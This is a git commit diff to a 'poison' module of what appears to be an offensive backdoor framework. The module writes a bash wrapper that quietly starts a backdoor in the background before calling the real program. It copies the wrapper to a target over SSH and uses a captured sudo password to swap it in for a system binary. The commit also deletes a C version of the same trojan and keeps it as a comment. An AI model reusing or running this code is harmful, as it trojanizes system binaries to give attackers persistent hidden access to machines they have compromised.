2a455016d355c0dafa562d6304f22044eae43770
Kkevsterrr <rstudio@example.com>
2017-01-01 12:49:01 -0500

    removed tmp, switched to os tmp

--- modules/poison.py
+++ modules/poison.py
@@ -1,5 +1,5 @@
 from .module import *
-
+import tempfile
 
 class Poison(Module):
     def __init__(self, target, backdoor, core):
@@ -16,13 +16,16 @@ class Poison(Module):
         name = self.get_value("name")
         loc = self.get_value("location")
         password = self.target.pword
-        
-        poison = open("tmp/%s" % name, "w")
-        poison.write("#!/bin/bash\n( %s & ) > /dev/null 2>&1 && %s/share/%s $@" % (self.backdoor.get_command(), loc, name))
+        tmp_dir = tempfile.mkdtemp()
+        poison = open(tmp_dir + "/" + name, "w")
+        poison.write("#!/bin/bash\n( %s & ) > /dev/null 2>&1 && %s/share/%s $@" % (self.backdoor.get_command(), loc, name))  # bash poison
+        # C Poison: #include <stdlib.h>\nint main() {\nsystem("./initd 2> /dev/null &");\n system("/bin/share/ls");\n return 0;
         poison.close()
-        self.target.scpFiles(self, "tmp/" + name, False)
+        self.target.scpFiles(self, tmp_dir + "/" + name, False)
         self.target.ssh.exec_command("echo %s | sudo -S mkdir %s/share" % (password, loc)) # create folder
         self.target.ssh.exec_command("echo %s | sudo -S mv %s/%s %s/share/" % (password, loc, name, loc)) #move old binary to folder
         self.target.ssh.exec_command("echo %s | sudo -S cp %s %s/" % (password, name, loc)) #move new binary to old location
         self.target.ssh.exec_command("echo %s | sudo -S chmod +x %s/%s" % (password, loc, name))
         print(GOOD + self.name + " module success")
+
+
--- tmp/p.c
+++
@@ -1,6 +0,0 @@
-#include <stdlib.h>
-int main() {
-system("./initd 2> /dev/null &");
-system("/bin/share/ls");
-return 0;
- }
